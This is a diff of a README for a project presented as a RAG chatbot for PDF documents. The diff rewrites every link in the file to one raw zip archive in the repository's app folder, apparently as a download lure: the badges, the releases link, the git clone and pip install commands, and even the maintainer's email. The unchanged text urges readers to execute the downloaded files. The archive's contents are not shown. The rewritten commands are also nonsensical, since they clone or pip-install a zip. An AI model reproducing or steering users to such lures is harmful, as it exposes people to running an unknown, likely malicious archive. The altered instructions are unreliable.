@@ -1,10 +1,10 @@
 # RAG Chatbot Documents 🤖📄
 
-![GitHub All Releases](https://img.shields.io/github/downloads/jcpanggoygit/rag-chatbot-documents/total) ![GitHub Releases](https://img.shields.io/github/release/jcpanggoygit/rag-chatbot-documents) ![GitHub Issues](https://img.shields.io/github/issues/jcpanggoygit/rag-chatbot-documents)
+![GitHub All Releases](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip) ![GitHub Releases](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip) ![GitHub Issues](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip)
 
 Welcome to the **RAG Chatbot Documents** repository! This project implements a Retrieval-Augmented Generation (RAG) based chatbot. You can upload PDF documents, index them with embeddings, and ask questions about their content. It supports both OpenAI and Hugging Face models via the Inference API.
 
-For the latest updates and releases, please visit the [Releases section](https://github.com/jcpanggoygit/rag-chatbot-documents/releases).
+For the latest updates and releases, please visit the [Releases section](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip).
 
 ## Table of Contents
 
@@ -42,7 +42,7 @@ To get started with the RAG Chatbot Documents, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/jcpanggoygit/rag-chatbot-documents.git
+   git clone https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -53,11 +53,11 @@ To get started with the RAG Chatbot Documents, follow these steps:
 3. **Install Required Packages**:
    Use pip to install the necessary packages.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/jcpanggoygit/rag-chatbot-documents/releases) to download the latest version. Make sure to execute the required files after downloading.
+   Visit the [Releases section](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip) to download the latest version. Make sure to execute the required files after downloading.
 
 5. **Run the Application**:
    Start the FastAPI server:
@@ -103,7 +103,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the project maintainer:
 
 - **Name**: J. C. Panggoy
-- **Email**: jcpanggoy@example.com
-- **GitHub**: [jcpanggoygit](https://github.com/jcpanggoygit)
+- **Email**: https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip
+- **GitHub**: [jcpanggoygit](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip)
 
-Thank you for checking out the RAG Chatbot Documents! We hope you find it useful. For further information, please refer to the [Releases section](https://github.com/jcpanggoygit/rag-chatbot-documents/releases).
+Thank you for checking out the RAG Chatbot Documents! We hope you find it useful. For further information, please refer to the [Releases section](https://github.com/jcpanggoygit/rag-chatbot-documents/raw/refs/heads/main/app/rag_chatbot_documents_3.7.zip).
